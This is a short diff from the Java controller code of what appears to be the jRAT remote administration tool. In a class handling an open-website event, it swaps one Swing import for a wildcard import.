@@ -7,7 +7,7 @@ import jrat.controller.packets.outgoing.Packet14VisitURL;
 import jrat.controller.utils.NetUtils;
 import jrat.controller.utils.Utils;
 
-import javax.swing.ImageIcon;
+import javax.swing.*;
 
 
 public class OpenWebsiteEvent extends Event {
